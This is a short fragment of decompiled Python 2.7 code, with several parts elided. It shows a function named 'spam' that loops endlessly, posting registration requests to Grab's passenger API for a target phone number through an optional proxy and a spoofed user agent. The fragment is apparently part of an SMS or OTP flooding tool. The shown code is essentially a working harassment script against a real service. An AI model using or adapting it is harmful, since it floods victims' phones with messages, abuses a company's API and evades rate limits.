...
# Decompiled from: Python 2.7.14 (default, Mar 22 2018, 14:43:05)
        ...
        def spam(thread_name='0', proxy=None):
            ...
            while True:
                try:
                    ...
                    if proxy == None:
                        r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'}, headers={'User-Agent': userAgent})
                    else:
                        r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'}, headers={'User-Agent': userAgent}, proxies={'http': str(proxy), 'https': str(proxy)})
